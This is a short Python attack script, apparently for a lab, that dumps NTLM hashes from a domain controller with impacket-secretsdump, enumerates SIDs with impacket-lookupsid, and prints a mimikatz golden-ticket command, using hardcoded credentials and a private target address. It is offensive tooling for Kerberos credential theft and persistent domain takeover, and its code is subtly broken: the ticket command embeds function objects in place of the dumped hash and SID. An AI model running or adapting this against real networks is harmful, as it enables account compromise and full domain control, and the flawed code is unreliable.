import subprocess
import re


def ntml(ip,domain,user,password):
    get_sid_cmd = f"/usr/bin/impacket-secretsdump -just-dc-ntlm {domain}/{user}:{password}@{ip} "
    print(get_sid_cmd)
    results = subprocess.Popen(get_sid_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, encoding='utf-8')
    results = results.stdout.readlines()
    print(results) 
    
def sid(ip,domain,user,password):
    get_sid_cmd = f"/usr/bin/impacket-lookupsid {domain}/{user}:{password}@{ip} "
    print(get_sid_cmd)
    results = subprocess.Popen(get_sid_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, encoding='utf-8')
    results = results.stdout.readlines()
    print(results) 

def golden(user,domain):
    golden_ticket = f"kerberos::golden /domain:{domain} /sid:{sid} /rc4:{ntml} /id:500 /user:{user} /ptt"
    print(golden_ticket)


#def golden_invoke(user,domain):
    #golden_ticket = f"\Users\sql\Desktop\mimikatz-master\x64\mimikatz.exe kerberos::golden /domain:{domain} /sid:{sid} /rc4:{ntml} /id:500 /user:{user} /ptt"
    #print(golden_ticket)

if __name__ == "__main__":
    ip = '10.120.32.30'
    domain = 'CS2B23.net'
    user = 'john'
    password = 'P@ssw0rd'
    ntml(ip,domain,user,password)
    sid(ip,domain,user,password)
    golden(user,domain)